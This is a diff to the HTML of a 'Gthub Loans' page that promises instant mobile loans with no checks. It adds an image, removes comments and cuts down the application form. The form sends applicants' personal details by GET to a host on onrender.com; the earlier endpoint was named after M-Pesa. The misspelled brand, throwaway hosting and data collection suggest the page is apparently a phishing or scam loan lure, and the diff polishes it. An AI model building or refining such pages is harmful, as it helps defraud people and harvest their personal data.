@@ -43,6 +43,14 @@
             font-size: 15px;
             color: #222222;
         }
+        .promo-image {
+            width: 100%;
+            height: auto;
+            max-width: 100%;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: block;
+        }
         .call-to-action {
             font-weight: bold;
             color: #000000;
@@ -72,7 +80,7 @@
             transition: border-color 0.2s;
         }
         input:focus {
-            border-color: #004B23; /* Focus glow matches theme */
+            border-color: #004B23;
         }
         input::placeholder {
             color: #888888;
@@ -91,7 +99,7 @@
             transition: background-color 0.2s;
         }
         .submit-btn:hover {
-            background-color: #003318; /* Darker green on hover */
+            background-color: #003318;
         }
     </style>
 </head>
@@ -102,19 +110,22 @@
         <!-- Loan Promotion Content Section -->
         <h1>Gthub Loans</h1>
         
-        <p class="intro-text">Get instant mobile loan directly on your phone—anytime, anywhere.</p>
+        <p class="intro-text">Get instant mobile loans directly on your phone—anytime, anywhere.</p>
         
         <div class="benefits-list">
             ✔️ Instant approval<br>
-            ✔️ No CRB check<br>
+            ✔️ No paperwork<br>
             ✔️ Flexible repayment terms<br>
             ✔️ Secure & reliable
         </div>
         
+        <!-- Your PC image linked accurately below -->
+        <img src="ddsdsgds.png" alt="Loan Promotion" class="promo-image">
+        
         <p class="call-to-action">💰 Borrow Today, Repay with Ease. Apply now</p>
 
         <!-- Form Section with Redirect Action -->
-        <form action="https://mpesa-api-z14k.onrender.com/" method="GET">
+        <form action="https://onrender.com" method="GET">
             
             <div class="field-group">
                 <label for="fullname">Full Name</label>
@@ -132,25 +143,10 @@
             </div>
 
             <div class="field-group">
-                <label for="nationalid">Date Of Birth</label>
-                <input type="text" id="nationalid" name="nationalid" placeholder="e.g. 01/01/1995" required>
+                <label for="county">County</label>
+                <input type="text" id="county" name="county" placeholder="e.g. Nairobi" required>
             </div>
-            
-            <div class="field-group">
-                <label for="nationalid">Loan Amount To Apply</label>
-                <input type="text" id="nationalid" name="nationalid" placeholder="e.g. 50000" required>
-            </div>
-            
-            <div class="field-group">
-                <label for="nationalid">County</label>
-                <input type="text" id="nationalid" name="nationalid" placeholder="e.g. Nairobi" required>
-            </div>
-            
-            <div class="field-group">
-                <label for="nationalid">Location</label>
-                <input type="text" id="nationalid" name="nationalid" placeholder="e.g. Kasarani" required>
-            </div>
-            
+
             <!-- Submit Button -->
             <button type="submit" class="submit-btn">Apply Now</button>
 
